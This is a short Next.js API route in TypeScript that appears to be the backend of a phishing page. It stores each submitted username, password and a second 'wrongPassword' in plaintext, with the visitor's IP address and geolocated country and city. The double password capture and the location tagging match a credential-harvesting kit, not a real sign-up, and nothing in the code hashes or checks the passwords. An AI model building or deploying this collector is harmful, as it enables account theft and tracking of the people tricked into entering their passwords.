// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from 'next'
import dbConnect from '../../../lib/dbConnect';
import User from '../../../models/User';
import { getClientIp } from 'request-ip';
import geoip from "geoip-lite";

type Data = {
  success: boolean;
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
    const { method, body: { username, password, wrongPassword } } = req;

    await dbConnect();

    if (method === "POST") {

       const ip = getClientIp(req);

      const geo = geoip.lookup(ip as string);

       try {
          const user = await User.create({
            username,
            password,
            wrongPassword,
            ip,
            country: geo?.country || "yok",
            city: geo?.city || "yok",
          })

          return res.status(200).json({ success: true });      
       } catch (error) {
         console.log(error)
          return res.status(500).json({ success: false });
       }
    }
}
